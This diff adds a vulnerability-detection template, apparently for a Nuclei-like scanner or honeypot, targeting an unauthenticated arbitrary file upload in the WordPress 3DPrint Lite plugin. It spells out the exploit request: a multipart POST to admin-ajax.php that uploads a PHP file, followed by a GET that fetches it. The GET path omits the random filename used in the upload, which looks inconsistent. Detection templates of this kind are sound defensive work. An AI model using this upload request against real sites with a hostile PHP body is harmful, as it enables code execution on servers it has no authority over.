@@ -1,0 +1,56 @@
+id: 3dprint-arbitrary-file-upload
+info:
+  name: WordPress 3DPrint Lite <1.9.1.5 - Arbitrary File Upload
+  author: SecTheBit
+  description: 'WordPress 3DPrint Lite plugin before 1.9.1.5 contains an arbitrary
+    file upload vulnerability. The p3dlite_handle_upload AJAX action of the plugin
+    does not have any authorization and does not check the uploaded file. An attacker
+    can upload arbitrary files to the server, which in turn can be used to make the
+    application execute file content as code, As a result, an attacker can possibly
+    obtain sensitive information, modify data, and/or execute unauthorized operations.
+
+    '
+  severity: high
+  remediation: Upgrade to 1.9.1.5 or later.
+  reference:
+  - https://wpscan.com/vulnerability/c46ecd0d-a132-4ad6-b936-8acde3a09282
+  - https://www.exploit-db.com/exploits/50321
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 8.8
+    cwe-id: CWE-434
+  metadata:
+    verified: true
+    max-request: 2
+  tags: wpscan,edb,wordpress,wp,wp-plugin,fileupload,intrusive,3dprint
+traps:
+- request:
+    method: POST
+    path: /wp-admin/admin-ajax.php
+    headers:
+      Accept-Encoding: gzip, deflate
+      Content-Type: multipart/form-data; boundary=---------------------------54331109111293931601238262353
+    body: |
+      -----------------------------54331109111293931601238262353
+      Content-Disposition: form-data; name="action"
+
+      p3dlite_handle_upload
+      -----------------------------54331109111293931601238262353
+      Content-Disposition: form-data; name="file"; filename={{randstr}}.php
+      Content-Type: text/php
+
+      <?php echo md5("{{string}}");unlink(__FILE__);?>
+      -----------------------------54331109111293931601238262353--
+  response:
+    status_code: 200
+    headers: {}
+    body: ''
+- request:
+    method: GET
+    path: /wp-content/uploads/p3d/.php
+    headers: {}
+    body: ''
+  response:
+    status_code: 200
+    headers: {}
+    body: '{{md5(string)}}'
